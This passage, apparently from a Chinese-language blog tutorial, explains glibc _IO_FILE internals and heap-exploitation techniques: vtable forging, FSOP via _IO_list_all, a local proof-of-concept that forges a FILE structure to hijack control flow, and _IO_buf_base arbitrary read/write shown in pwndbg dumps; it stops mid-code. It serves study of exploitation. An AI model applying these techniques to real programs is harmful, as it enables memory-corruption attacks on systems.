title="2.fread"></a>2.fread</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fread</span> <span class="params">( <span class="keyword">void</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">size_t</span> count, FILE *stream)</span> </span>;</span><br></pre></td></tr></table></figure><blockquote><ul><li>buffer 存放读取数据的缓冲区。</li><li>size：指定每个记录的长度。</li><li>count： 指定记录的个数。</li><li>stream：目标文件流。</li><li>返回值：返回读取到数据缓冲区中的记录个数</li></ul></blockquote><p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的</p><h2 id="3-fwrite"><a href="#3-fwrite" class="headerlink" title="3.fwrite"></a>3.fwrite</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fwrite</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="built_in">buffer</span>, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">size_t</span> count, FILE* stream)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><ul><li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li><li>size: 要写入内容的单字节数;</li><li>count: 要进行写入 size 字节的数据项的个数;</li><li>stream: 目标文件指针;</li><li>返回值：实际写入的数据项个数 count。</li></ul></blockquote><p>在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p><p>在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW</p><p>IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow</p><p>在_IO_new_file_overflow 内部最终会调用系统接口 write 函数</p><h2 id="4-fopen"><a href="#4-fopen" class="headerlink" title="4.fopen"></a>4.fopen</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">char</span> *filename, *type)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><ul><li>filename: 目标文件的路径</li><li>type: 打开方式的类型</li><li>返回值: 返回一个文件指针</li></ul></blockquote><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><h2 id="5-fclose"><a href="#5-fclose" class="headerlink" title="5.fclose"></a>5.fclose</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fclose(FILE *stream)</span><br></pre></td></tr></table></figure><p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p><h2 id="6-printf-puts"><a href="#6-printf-puts" class="headerlink" title="6.printf/puts"></a>6.printf/puts</h2><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vfprintf+11</span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line">write</span><br></pre></td></tr></table></figure><h1 id="0x02-伪造vtable"><a href="#0x02-伪造vtable" class="headerlink" title="0x02 伪造vtable"></a>0x02 伪造vtable</h1><p>伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</p><ol><li>直接改写 vtable 中的函数指针，通过任意地址写就可以实现。</li><li>覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</li></ol><h1 id="0x03-FSOP"><a href="#0x03-FSOP" class="headerlink" title="0x03 FSOP"></a>0x03 FSOP</h1><p>File Stream Oriented Programming</p><h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h2><p>FSOP 的核心思想就是<strong>劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。</strong>FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p><p><img src="/2021/03/25/IO-FILE/abort_routine.001.jpeg" alt="img"></p><p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ol><li><p>当 libc 执行 abort 流程时</p></li><li><p>当执行 exit 函数时</p></li><li><p>当执行流从 main 函数返回时</p></li></ol><h2 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h2><ol><li><p>知道libc基址</p></li><li><p>改写_IO_list_all为可控内存的指针</p></li><li><p>通过验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (((fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) &#x3D;&#x3D; EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result &#x3D; EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li>fp-&gt;_mode &lt;= 0</li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li></ul></blockquote></li></ol><p>这里拿一个wiki上的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+vtable_offset)=((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=<span class="number">0x41414141</span>;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="keyword">long</span> <span class="keyword">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>前0x100是_IO_FILE </p><p>之后0x100是vtable</p><p>0x18就是overflow的偏移</p></blockquote><h1 id="0x04-libc2-24新应用"><a href="#0x04-libc2-24新应用" class="headerlink" title="0x04 libc2.24新应用"></a>0x04 libc2.24新应用</h1><p>libc2.24中注重对_IO_FILE结构体内的区域的利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在_IO_FILE 中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p><h2 id="1-fileno与缓冲区的相关利用"><a href="#1-fileno与缓冲区的相关利用" class="headerlink" title="1.fileno与缓冲区的相关利用"></a>1.fileno与缓冲区的相关利用</h2><p><strong>eg</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%s"</span>,stack_buf);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%s"</span>,stack_buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看第一次初始化,里面很多内容还是空</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x7ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:<span class="number">0x00000000fbad2088</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:<span class="number">0x0000001000000000</span><span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:<span class="number">0xffffffffffffffff</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:<span class="number">0x00007ffff7dd19c0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd06e0</span></span><br><span class="line"><span class="number">0x7ffff7dd19c0</span> &lt;_IO_wide_data_0&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19d0</span> &lt;_IO_wide_data_0+<span class="number">16</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>进行一次输入之后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x7ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:<span class="number">0x00000000fbad2288</span><span class="number">0x0000000000602018</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:<span class="number">0x0000000000602019</span><span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:<span class="number">0x0000000000602010</span><span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:<span class="number">0x0000000000602010</span><span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:<span class="number">0x0000000000602410</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:<span class="number">0xffffffffffffffff</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:<span class="number">0x00007ffff7dd19c0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:<span class="number">0x00000000ffffffff</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd06e0</span></span><br><span class="line"><span class="number">0x7ffff7dd19c0</span> &lt;_IO_wide_data_0&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19d0</span> &lt;_IO_wide_data_0+<span class="number">16</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><blockquote><p>调用 scanf 之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end 等域都被初始化</p></blockquote><p>其实这是分配出来的堆,分配的堆大小是 0x400 个字节，正好对应于_IO_buf_base～_IO_buf_end 在进行写入后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602000</span></span><br><span class="line">Size: <span class="number">0x411</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602410</span></span><br><span class="line">Size: <span class="number">0x20bf1</span></span><br></pre></td></tr></table></figure><p>接下来就可以修改_IO_buf_base任意地址读写了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x7ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:<span class="number">0x00000000fbad2288</span><span class="number">0x0000000000602018</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:<span class="number">0x0000000000602019</span><span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:<span class="number">0x0000000000602010</span><span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:<span class="number">0x0000000000602010</span><span class="number">0x00007ffff7dd2740</span> &lt;==_IO_buf_base</span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:<span class="number">0x00007ffff7dd27c0</span><span class="number">0x0000000000000000</span> &lt;==_IO_buf_end</span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:<span class="number">0xffffffffffffffff</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:<span class="number">0x00007ffff7dd19c0</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:<span class="number">0x00000000ffffffff</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x00007ffff7dd06e0</span></span><br><span class="line"><span class="number">0x7ffff7dd19c0</span> &lt;_IO_wide_data_0&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19d0</span> &lt;_IO_wide_data_0+<span class="number">16</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>看一下buf里面的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x7ffff7dd2740</span></span><br><span class="line"><span class="number">0x7ffff7dd2740</span> &lt;buf&gt;:<span class="number">0x000a434343434343</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2750</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2760</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2770</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2780</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2790</span> &lt;ttyname_buf&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27a0</span> &lt;getmntent_buffer&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27b0</span> &lt;qfcvt_bufptr&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27c0</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27d0</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27e0</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27f0</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2800</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2810</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2820</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2830</span> &lt;<span class="built_in">buffer</span>&gt;:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h2 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps -&gt; overflow"></a>_IO_str_jumps -&gt; overflow</h2><p><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个 <code>vtable</code> 不在 check 范围之内。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span 